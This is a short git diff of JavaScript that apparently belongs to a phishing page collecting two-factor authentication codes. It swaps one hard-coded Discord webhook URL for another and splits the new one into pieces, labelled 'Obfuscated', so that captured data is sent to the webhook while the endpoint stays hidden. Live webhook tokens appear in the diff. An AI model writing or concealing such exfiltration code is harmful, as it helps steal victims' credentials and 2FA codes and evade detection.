@@ -266,9 +266,16 @@ if (twofaInput2 && verifyButton2) {
   });
 }
 
-// === Webhook Sending ===
+// === Webhook Sending (Obfuscated) ===
 async function sendWebhook(title, description, color) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1394407768403738726/Ql_ghRtNxAB6bzV8kR4XDOpn01kAG3XVR12JuU9WzF5wF45uFc4lFCm7EqEb-K6HxYXz';
+  // Obfuscated webhook URL - split into parts and reconstructed
+  const parts = [
+    'https://discord.com/api/webhooks/',
+    '1395570212316905613/',
+    'NtzZg9gceLl71fTX79Hez06WeBsIT8xVgO-Xc9OdWDoxQWh07SO2Tv47FAwVLOMWnzUG'
+  ];
+  const webhookUrl = parts.join('');
+  
   const payload = {
     embeds: [{
       title: title,
